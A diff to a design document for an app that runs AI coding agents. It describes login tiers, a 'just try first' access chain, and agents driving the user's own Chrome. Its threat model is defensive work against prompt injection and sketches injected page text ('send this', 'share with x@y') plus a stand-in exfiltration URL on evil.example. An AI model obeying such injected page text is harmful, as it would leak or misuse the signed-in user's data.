@@ -703,8 +703,10 @@ calls):
   `chmod` (no setuid) and unpacking inside the home, never into a shell
   profile, `~/Library/LaunchAgents`, `~/Library/Preferences`, a PATH folder,
   a protected place above, the agent's own log files, or any `.git` /
-  `.shipstudio` folder; deleting only inside the agent's own home or its copy
-  of a project (never the folder itself); the project's build, check and test
+  `.shipstudio` folder; deleting only folders the tools rebuild
+  (`node_modules`, `dist`, `build`, `.next`, `target`, `.cache`, and what is
+  inside them) in the agent's own home or its copy of a project — every other
+  delete asks, even there; the project's build, check and test
   tools (`npm test`, `pnpm run build`, `cargo test`, `npx tsc`, `make test`…);
   and scripts in the home whose text is read first: a shell script line by
   line through the same classifier, other languages refused on sight of
@@ -924,17 +926,161 @@ to do (read; and, when `scopes` asks for more, send/post/change, which
 
 | Tier | Way in | Where the sign-in is kept | Engines |
 | --- | --- | --- | --- |
-| 1 | **Use \<account>**: an account already connected for another agent | as below | as below |
+| 1 | **Use \<account>**: an account already connected (ours) for another agent | as below | as below |
 | 1 | **Connect** (ours, `oauth.rs`): the app's own OAuth in the Mac's browser | this Mac's Keychain, `<slug>-connection-<id>` | both |
-| 1 | **Connect** (claude.ai connector): opens claude.ai's connector settings in the Mac's browser if it isn't added yet; the card watches `claude mcp list` until it's connected | claude.ai | Claude Code |
 | 1 | **Use GitHub on this Mac**: the `gh` sign-in | `gh`'s own Keychain item | both |
-| 2 | **Use my browser**: Claude in Chrome, in the user's own Chrome where they're signed in; every click/post/send/pay asks | nowhere new | Claude Code |
-| 3 | **Enter an API key**: the masked field (`secrets.rs`), only where a key made for programs is a real way in (X API, Stripe restricted key, an app we don't know) | this Mac's Keychain | both |
+| 2 | **Use my browser**: Claude in Chrome, in the user's own Chrome where they're signed in; every click/post/send/pay asks. The default for every service without our own OAuth (Gmail, Calendar, Drive, Slack, LinkedIn, X…) | nowhere new | Claude Code |
+| 3 | **Use claude.ai's connector** (optional, after the browser): opens claude.ai's connector settings in the Mac's browser if it isn't added yet; the card watches `claude mcp list` until it's connected. If it doesn't, the card says to use the browser instead: never a dead end. A claude.ai connection made for another agent sits here too | claude.ai | Claude Code |
+| 4 | **Enter an API key**: the masked field (`secrets.rs`), only where a key made for programs is a real way in (X API, Stripe restricted key, an app we don't know) | this Mac's Keychain | both |
 
 A service with no connector says so in one line on the card ("LinkedIn has
 no connector agents can sign in to."), instead of a password field. A Codex
 agent is told plainly what it can't use (claude.ai connectors and the
 browser are Claude Code's).
+
+### Just try first (`agents/access_chain.rs`)
+
+Answers: **does an agent get on with the job instead of asking for a login?**
+"Go do this in Figma" means: look for Figma access, else use the user's
+signed-in browser and say which account it's in, and ask only if both fail.
+
+`request_login` runs the chain on the Mac before any card, per task:
+
+1. **Said no already**, for anyone on the team (declined, or "Not needed",
+   on a card or on the setup checklist, kept after the checklist is put
+   away): never asked again; the agent carries on without it. A service the
+   catalogue doesn't know matches however it's spelled ("Acme CRM",
+   "acme-crm").
+2. **Granted already**: one of our own working connections (OAuth, `gh`).
+   A claude.ai connector doesn't count (it isn't always recognised in a
+   turn): it's an optional extra after the browser, never the default.
+3. **This Mac is signed in**: GitHub through `gh` (granted silently: the
+   agent could run `gh` anyway, and every change asks through the broker).
+4. **The user's browser**, when this turn has it (below) and the service has
+   a site: the site is added to the agent's `browser_sites` and it's told to
+   open it in a new tab and say "I'm in Figma as …" from what the page shows,
+   never a guess. A sign-in page sends it back with `signed_out: true`.
+5. **Someone's card for it is waiting**: the agent joins that card
+   (`login-waiters.json`; the card shows "Also for …") and gets the same
+   answer, never more access than the card allowed.
+6. **One at a time**: an agent with a sign-in card waiting can't raise another.
+7. Only then one card, whose first way in is a sign-in button; a key field
+   only where the service has nothing else.
+
+Every agent's `## Getting access` rules, the Chief's instructions (upgraded
+by `PAST_CHIEF_INSTRUCTIONS`) and an imported agent's "Where you are now"
+logins bullet (upgraded in place by exact match, `arrival::PAST_LOGINS_LINES`)
+say the same: try the chain, ask only when blocked on the user's actual task,
+never up front, one thing at a time, never a password or token in chat.
+
+A connection someone else has (not this agent) still needs a one-tap "Use
+\<account>" card: per-agent grants stay the wall for connectors.
+
+### Your browser (`agents/browser.rs`)
+
+The mechanism is Claude Code's **Claude in Chrome**: `claude --chrome` loads
+the `claude-in-chrome` MCP server into a turn, which drives the Claude in
+Chrome extension in the user's own Chrome (open tabs, navigate, read text or
+the accessibility tree, screenshots, click, type, fill forms). The extension
+must be signed in to the **same claude.ai account** as Claude Code, and Claude
+Code must be signed in with claude.ai (an API key keeps it off). Codex has no
+equivalent here: Codex agents never get the browser and ask instead.
+
+**Set up once, checked by the app.** ⌘K "Let agents use your browser…", the
+setup checklist and "What it can reach" open one guided card: Claude Code
+signed in (`claude auth status`), the extension in a Chrome profile, and a
+browser answering. The last is asked of `claude --claude-in-chrome-mcp`
+(the same server, over stdio) with `list_connected_browsers`: no model turn,
+nothing opened. That flag isn't in `--help`; verified on 2.1.318. **Turn on**
+only works once a browser answers. Teams whose user chose "Use my browser" on
+a login card in an older build start switched on.
+
+**Who gets it.** A turn runs `--chrome` only when the team's switch is on, the
+agent's own isn't off, it runs on Claude Code, and the turn doesn't answer
+outside text (a "When…" routine's items, or a message carrying that taint
+through `message_agent` or a room): those run `--no-chrome`, and the broker
+refuses any browser call they make anyway.
+
+**What asks** (`browser::gate`, before Always-allow rules): reads go through
+without a card (`get_page_text`, `read_page`, `find`, tabs, screenshots,
+scrolling, recording a GIF) and so does `navigate` (or a new tab opened on a
+URL) to a site in the agent's `browser_sites`, unless the URL carries another
+URL (`//` anywhere after the host, plain or percent-encoded): an own site's
+redirect endpoint would otherwise carry data off-site. Any other site, and
+every click, keystroke, form fill, upload, script, shortcut, batch or GIF
+export, asks on an Allow card (`browser::card_for`) saying exactly what it
+does (the text typed, the value filled, the file, the script) and where and
+as whom: the site the agent last opened and the account it was found signed
+in as there (`browser_profiles`), or "whoever is signed in there". A click's
+card can't see what the button sends, so the agent is told to say in chat,
+before it, exactly what will go and from which account. `browser_sites` only ever holds a catalogue
+service's built-in host (`logins::SERVICES`): the access chain, a login card's
+"Use my browser" and the reach check add one; nothing an agent or an import
+types becomes a site.
+
+**Which Chrome profile** (`agents/browser_profiles.rs`). The extension can sit
+in more than one Chrome profile, each signed in as someone else. When the
+chain hands an agent the browser, the app lists the connected browsers itself
+(`list_connected_browsers`, nothing opened) and tells the agent where to
+start: the profile this site was last found in, the only one, or each in
+turn. The agent opens the site, reads which account it shows, and moves with
+`select_browser` / `switch_browser` (looks, no card) when it's the wrong one.
+With no other profile connected it calls `ask_bring_browser_to_front`: one
+plain card, "Bring your sam@work Chrome window to the front so I can use it",
+Check again / Not now, never a login ask, joined team-wide like a login card.
+`remember_browser_account` keeps site → profile and account in app data
+(`browser-accounts.json`, only for the agent's own sites, never from outside
+text), shown with Forget under "What it can reach". The extension's own
+per-site permission prompt is left as it is. **Partly verified:** on the Mac
+this was built on the extension was in two profiles but only one browser
+("Browser 1") was connected at a time, so switching between two connected
+profiles hasn't been seen working, and the answer's shape is read leniently
+(`parse_browsers`).
+
+**Threat model.** The agent acts as the user, in sessions the user is signed
+in to. The risk is a page's own text (an email, a doc, a profile) telling the
+agent to do something: prompt injection. What stands against it:
+- Anything that acts on a page asks on a card, so an injected "send this",
+  "delete that" or "share with x@y" reaches the user as a request.
+- Navigation outside the agent's sites asks, so an injected "open
+  https://evil.example/?q=<what you read>" can't carry data out silently.
+  (A read-only page could still show text the agent repeats in chat; that
+  stays on this Mac.)
+- Text from outside never drives the browser (`--no-chrome` + refusal; a
+  turn with no reach worked out runs `--no-chrome` too). Nor does it get
+  anything granted through the access chain: such a turn skips the silent
+  `gh` grant and the browser step and never joins another agent's card (whose
+  answer would grant it); it ends on its own card.
+- Passwords are never typed: the rules say stop at a sign-in page.
+- The user can take it away per agent, or switch the team's off.
+Not covered: the extension's own per-site permissions are the user's to set
+in Chrome; a site the agent was given can still be read in full once open.
+
+### Checking what your team can already reach (`agents/access_check.rs`)
+
+An import used to put a card in every imported agent's chat for every login
+it had used elsewhere. Now nothing is asked up front: an imported agent's
+logins become **Maybe later** rows on "Setting up your team", one per service
+team-wide, and the app checks them itself straight after the import (and from
+⌘K "Check what your team can already reach" or the step's Check again), in
+order and read-only: one of our own connections already made; this Mac's
+sign-ins (`gh`, `vercel whoami`); once the team's browser is on, the
+service's account page opened in a new tab, looked at (did it land on a
+sign-in page?) and closed; and last, as an extra, an app in Claude Code
+(`claude mcp list`: a claude.ai connector or the user's own server). Only services someone mentioned are opened; no
+click, no typing; nothing kept beyond the service, how it was reached and an
+account name a connection or CLI reported.
+
+A reached row closes with a receipt ("Figma: your browser, signed in on
+www.figma.com"); for the browser, the agents that mentioned it get the site.
+The Logins step shows only the residue ("Your team is ready. 3 things I
+couldn't reach on this Mac"), each with one sign-in button that raises one
+quiet card and starts its best way in at once (others join it), or "Get your
+key"/"Add a key" when a key is all there is, and Not needed. Progress is one
+line on desk and phone ("Checking 14 services… Figma ✓ GitHub ✓"). Only the
+app starts it: there's no agent tool for it. Quiet import cards an older build
+raised are folded into rows at launch (`team_setup::fold_cards`), each closed
+with a line saying so.
 
 ### Which services have a real connector (checked 2026-11)
 
